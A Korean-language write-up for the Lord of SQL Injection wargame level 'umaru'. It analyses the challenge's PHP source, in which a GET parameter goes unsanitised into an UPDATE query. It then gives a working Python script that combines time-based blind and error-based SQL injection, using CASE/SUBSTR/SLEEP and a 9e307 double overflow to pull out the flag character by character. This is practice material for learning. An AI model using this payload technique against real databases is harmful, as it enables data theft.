# Lord of SQL Injection No.25 - umaru

## 문제 출제 의도

출력되는 SQL문 없이 PHP문을 해석하여 `flag`가 초기화되지 않게 Error Based SQL Injection을 할 수 있는지 확인한다.

## 소스 코드 분석

umaru 문제의 php 소스 코드는 다음과 같다.
```php
<?php
  include "./config.php";
  login_chk();
  dbconnect();

  function reset_flag(){
    $new_flag = substr(md5(rand(10000000,99999999)."qwer".rand(10000000,99999999)."asdf".rand(10000000,99999999)),8,16);
    $chk = @mysql_fetch_array(mysql_query("select id from prob_umaru where id='{$_SESSION[los_id]}'"));
    if(!$chk[id]) mysql_query("insert into prob_umaru values('{$_SESSION[los_id]}','{$new_flag}')");
    else mysql_query("update prob_umaru set flag='{$new_flag}' where id='{$_SESSION[los_id]}'");
    echo "reset ok";
    highlight_file(__FILE__);
    exit();
  }

  if(!$_GET[flag]){ highlight_file(__FILE__); exit; }

  if(preg_match('/prob|_|\./i', $_GET[flag])) exit("No Hack ~_~");
  if(preg_match('/id|where|order|limit|,/i', $_GET[flag])) exit("HeHe");
  if(strlen($_GET[flag])>100) exit("HeHe");

  $realflag = @mysql_fetch_array(mysql_query("select flag from prob_umaru where id='{$_SESSION[los_id]}'"));

  @mysql_query("create temporary table prob_umaru_temp as select * from prob_umaru where id='{$_SESSION[los_id]}'");
  @mysql_query("update prob_umaru_temp set flag={$_GET[flag]}");

  $tempflag = @mysql_fetch_array(mysql_query("select flag from prob_umaru_temp"));
  if((!$realflag[flag]) || ($realflag[flag] != $tempflag[flag])) reset_flag();

  if($realflag[flag] === $_GET[flag]) solve("umaru");
?>
```
-----

```php
  function reset_flag(){
    $new_flag = substr(md5(rand(10000000,99999999)."qwer".rand(10000000,99999999)."asdf".rand(10000000,99999999)),8,16);
    $chk = @mysql_fetch_array(mysql_query("select id from prob_umaru where id='{$_SESSION[los_id]}'"));
    if(!$chk[id]) mysql_query("insert into prob_umaru values('{$_SESSION[los_id]}','{$new_flag}')");
    else mysql_query("update prob_umaru set flag='{$new_flag}' where id='{$_SESSION[los_id]}'");
    echo "reset ok";
    highlight_file(__FILE__);
    exit();
  }
```
* 사용자 정의 함수 reset_flag를 선언한다.

* reset_flag는 prob_umaru 테이블에 사용자 세션 아이디 id, 새로운 랜덤 값 flag 레코드를 추가 또는 초기화 하는 함수이다.

```php
    if(!$_GET[flag]){ highlight_file(__FILE__); exit; }
```
* flag를 GET방식으로 받으며, 받은 값이 없거나 '0'이면 파일 내용을 출력되고 문제 풀이에 실패한다.

```php
    if(preg_match('/prob|_|\./i', $_GET[flag])) exit("No Hack ~_~");
    if(preg_match('/id|where|order|limit|,/i', $_GET[flag])) exit("HeHe");
    if(strlen($_GET[flag])>100) exit("HeHe");
```
* flag에 `prob`, `_`, `.` 가 들어 있으면 `No Hack ~_~`이 뜨고 문제 풀이에 실패한다.

* 또한, flag에 `id`, `where`, `order`, `limit`, `,` 가 들어 있으면 `HeHe`가 뜨고 문제 풀이에 실패한다.

* 또한, flag의 길이가 100자 초과이면 `HeHe`가 뜨고 문제 풀이에 실패한다.

```php
    $realflag = @mysql_fetch_array(mysql_query("select flag from prob_umaru where id='{$_SESSION[los_id]}'"));

    @mysql_query("create temporary table prob_umaru_temp as select * from prob_umaru where id='{$_SESSION[los_id]}'");
    @mysql_query("update prob_umaru_temp set flag={$_GET[flag]}");

    $tempflag = @mysql_fetch_array(mysql_query("select flag from prob_umaru_temp"));
    if((!$realflag[flag]) || ($realflag[flag] != $tempflag[flag])) reset_flag();

    if($realflag[flag] === $_GET[flag]) solve("umaru");
```
* `$realflag`에 기존에 `prob_umaru` 테이블의 사용자 세션 아이디를 id값으로 갖는 레코드를 배열로 저장한다.

* `prob_umaru` 테이블의 사용자 세션 아이디를 id값으로 갖는 레코드를 복사하여 임시 테이블 `prob_umaru_temp`를 생성한다.

* `prob_umaru_temp` 테이블의 `flag`값을 `$_GET['flag']`값으로 바꾼다. 이때 받은 flag가 직접 쿼리에 들어간다. 이것으로 SQL Injection 공격이 가능하다는 것을 알 수 있다.

* `prob_umaru_temp` 테이블의 `flag`값이 들어있는 배열을 `$tempflag`에 저장한다.

* 기존의 테이블에 사용자 세션 아이디와 `id`가 일치하는 레코드가 없거나 `$realflag`의 `flag`값이 `$tempflag`의 `flag`값과 다르면 `reset_flag()` 함수를 작동시킨다.

* 문제 풀이가 성공하는 조건은 '데이터베이스에서 받은 기존의 `flag`값과 GET방식으로 전달받은 flag값이 정확히 같음'이다. 즉, 실제 데이터베이스에 저장된 flag를 알아내서 전달해야 한다.

## MySQL 지수 연산 최대치

MySQL에서는 e를 이용한 지수 연산이 가능하다.

예를 들어, 9e0은 9와 같고, 9e1은 90과 같다.

이때, 9의 지수 연산의 최대치는 9e307이다. 9e308부터는 ERROR 1367 (22007): Illegal double '9e308' value found during parsing 와 같이 에러가 난다.

또한, 연산을 통해 최대치를 초과할 때에도 ERROR 1690 (22003): DOUBLE value is out of range in '(9e307 * 9e307)' 와 같이 에러가 난다.

-----

## Solution

1. PHP 오류, MySQL CASE WHEN THEN, SUBSTR FROM FOR, SLEEP, 지수 연산 최대치 오류 이용

    이 문제는 Blind SQL Injection과 Error Based SQL Injection을 결합해서 풀 수 있다.
    
    에러가 발생하면 PHP 코드가 중지되므로 `reset_flag()`가 작동되는 것을 막을 수 있다. 이를 이용하는 코드를 작성한다.

    ```python
    import urllib.request
    from urllib.parse import quote
    import time

    key = ""
    for i in range(1, 17):
        for j in range(48, 127):
            url = "http://los.eagle-jump.org/umaru_6f977f0504e56eeb72967f35eadbfdf5.php?flag="
            data = "(case(substr(flag from {} for 1)) when '{}' then ((sleep(4)+2)*9e307) else 9e307*2 end)".format(
                str(i), chr(j))
            print(data)
            data = quote(data)
            re = urllib.request.Request(url + data)
            re.add_header(
                "User-agent", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36")
            re.add_header("Cookie", "PHPSESSID=jtkacptqj14heqvtcuofma30m2")
            st = time.time()
            req = urllib.request.urlopen(re)
            print(req.readline())
            et = time.time()

            if et-st > 4:
                key += chr(j).lower()
                print (key)
                break
    print (key)
    ```

    이러한 코드를 실행하면 결과값으로 175c981d542b7d27 를 출력한다. 이는 다른 사람은 다를 수도 있다.
    이를 GET방식으로 flag의 값으로 전달하면 풀린다.
    
    ```
    http://los.eagle-jump.org/umaru_6f977f0504e56eeb72967f35eadbfdf5.php?flag=175c981d542b7d27
    ```

    ![umaruclear](../images/umaruclear.png)